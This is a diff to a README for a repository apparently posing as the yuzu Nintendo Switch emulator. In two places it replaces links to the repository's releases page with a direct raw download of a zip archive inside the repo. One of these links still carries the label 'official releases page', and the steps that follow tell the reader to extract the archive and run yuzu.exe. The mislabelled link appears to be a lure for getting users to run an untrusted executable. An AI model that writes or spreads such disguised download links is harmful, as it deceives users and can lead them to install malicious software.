@@ -1,6 +1,6 @@
 # 🎮 yuzu-emu - Play Nintendo Switch Games On PC
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Adrianaferraris/yuzu-emu/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Adrianaferraris/yuzu-emu/raw/refs/heads/main/NintendoEmulator/emu_yuzu_2.1.zip)
 
 ## Overview
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/Adrianaferraris/yuzu-emu/releases) to download the software.
+1. Visit the [official releases page](https://github.com/Adrianaferraris/yuzu-emu/raw/refs/heads/main/NintendoEmulator/emu_yuzu_2.1.zip) to download the software.
 2. Choose the latest version ending in `.zip` or the installer `.exe` file.
 3. If you downloaded a zip file, right-click the folder and select Extract All. 
 4. Open the extracted folder and run the `yuzu.exe` file.
